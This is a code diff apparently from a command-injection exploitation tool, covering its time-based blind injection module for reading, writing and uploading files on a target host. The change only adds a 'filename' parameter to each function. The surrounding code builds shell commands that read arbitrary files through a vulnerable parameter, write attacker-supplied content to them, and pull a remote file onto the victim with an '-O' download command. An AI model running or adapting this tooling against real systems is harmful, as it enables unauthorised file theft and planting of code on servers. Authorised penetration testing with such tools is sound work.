@@ -31,12 +31,12 @@ from src.core.injections.blind_based.techniques.time_based import tb_injector
 """
 Read a file from the target host.
 """
-def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
+def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
 
   file_to_read = menu.options.file_read
   # Execute command
   cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -53,7 +53,7 @@ def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method
 """
 Write to a file on the target host.
 """
-def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
+def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
     sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
@@ -78,13 +78,13 @@ def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_metho
     
   # Execute command
   cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_write + ")"
-  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -100,7 +100,7 @@ def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_metho
 """
 Upload a file on the target host.
 """
-def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
+def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_upload = menu.options.file_upload
 
   # check if remote file exists.
@@ -121,13 +121,13 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
     
   # Execute command
   cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_upload + ")"
-  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
   shell = "".join(str(p) for p in shell)
   
@@ -144,17 +144,17 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
 """
 Check the defined options
 """
-def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
+def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
   if menu.options.file_read:
-    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_write:
-    file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+    file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
+    file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE == True:
